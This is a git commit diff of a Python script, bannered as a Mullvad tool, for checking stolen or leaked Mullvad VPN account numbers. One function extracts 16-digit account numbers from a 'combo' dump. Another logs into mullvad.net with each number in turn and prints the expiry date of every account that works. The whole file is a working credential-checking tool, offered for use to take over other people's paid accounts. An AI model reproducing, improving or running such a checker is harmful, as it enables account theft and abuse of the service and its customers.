ac96741e31335842a0ac0356f4f351c536e8e70c
Mmm <BW1MtXl1j4prQQg@proton.me>
2025-01-13 20:52:50 +0900

    fixed by lolineko

--- main.py
+++ main.py
@@ -1,16 +1,53 @@
-import requests
 import os
 import re
+import requests
 from bs4 import BeautifulSoup
 
-def clear_screen():
-    if os.name == "posix":
-        os.system("clear")
-    else:
-        os.system("cls")
 
-def menu():
-    clear_screen()
+def mode_select():
+    mode = str(input("Mode>> "))
+
+    if mode == "1":
+        print("insert ids in list.txt first")
+        checker()
+    if mode == "2":
+        print("insert combo txt in combo.txt")
+        formatter()
+        print("saved to list.txt")
+    else:
+        print("Invild mode")
+
+def live_check(id: str):
+    session = requests.session()
+    res = session.post("https://mullvad.net/en/account/login", data={"account_number": id}, headers={"Origin": "https://mullvad.net"}).json()
+    if res["type"] == "redirect":
+        res2 = session.get("https://mullvad.net/en/account")
+        soup = BeautifulSoup(res2.text, "html.parser")
+        time = soup.find(attrs={"data-cy": "account-expiry"}).text
+        print(f"{time} | {id}")
+    else:
+        print(f"Failed to login | {id}")
+
+def checker():
+    with open("./data/list.txt", "r", encoding="utf-8") as file:
+        ids = file.readlines()
+    for id in ids:
+        live_check(id)
+
+def formatter():
+    contents = []
+    with open("./data/combo.txt", "r", errors="ignore", encoding="utf-8") as f:
+        text = f.read()
+
+    accounts = list(set(re.findall(r"\b(\d{16}|\d{4}[:\s]\d{4}[:\s]\d{4}[:\s]\d{4})\b", text)))
+    for content in accounts:
+        content = content.replace(" ","").replace(":","")
+        contents.append(content)
+
+    with open("./data/list.txt", "w", errors="ignore", encoding="utf-8") as f:
+        f.write("\n".join(contents))
+
+if __name__ == "__main__":
     print("""
 ███╗   ███╗██╗   ██╗██╗     ██╗    ██╗   ██╗ █████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
 ████╗ ████║██║   ██║██║     ██║    ██║   ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
@@ -21,45 +58,11 @@ def menu():
         made by ゆうぽん＃チック症  「チェック」だけに「チック」!wwwwwwwwwww
         [01] Live Checker   [02] Combo Formatter                                                                          
     """)
-    mode = int(input("Mode>> "))
-    if mode == 1:
-        print("[insert ids in list.txt first]")
-        checker()
-    if mode == 2:
-        print("[insert combo txt in combo.txt]")
-        formatter()
-        print("saved to list.txt")
-    else:
-        menu()
-
-def live_check(id: str):
-    session = requests.session()
-    res = session.post("https://mullvad.net/en/account/login", data={"account_number": id}, headers={"Origin": "https://mullvad.net"}).json()
-    if res["type"] == "redirect":
-        res2 = session.get("https://mullvad.net/en/account")
-        soup = BeautifulSoup(res2.text, "html.parser")
-        time = soup.find(attrs={"data-cy": "account-expiry"}).text
-        # time = session.get("https://mullvad.net/en/account/__data.json", params={"x-sveltekit-invalidated": "0110"}, cookies={"accessToken": session.cookies["accessToken"]}).json()["nodes"][1]["data"][4]
-        print(f"{time} | {id}")
-    else:
-        print(f"Failed to login | {id}")
-
-def checker():
-    with open("./data/list.txt", "r", errors="ignore", encoding="utf-8") as file:
-        ids = file.readlines()
-    for id in ids:
-        live_check(id)
-
-def formatter():
-    contents = []
-    with open("./data/combo.txt", "r", errors="ignore", encoding="utf-8") as f:
-        text = f.read()
-    num = list(set(re.findall(r"\b(\d{16}|\d{4}[:\s]\d{4}[:\s]\d{4}[:\s]\d{4})\b", text)))
-    for content in num:
-        content = content.replace(" ","").replace(":","")
-        contents+=f"{content}\n"
-    with open("./data/list.txt", "w",errors="ignore", encoding="utf-8") as f:
-        f.write(f"{content}")
-
-if __name__ == "__main__":
-    menu()
+    
+    while True:
+        try:
+            mode_select()
+        except KeyboardInterrupt:
+            break
+        else:
+            pass
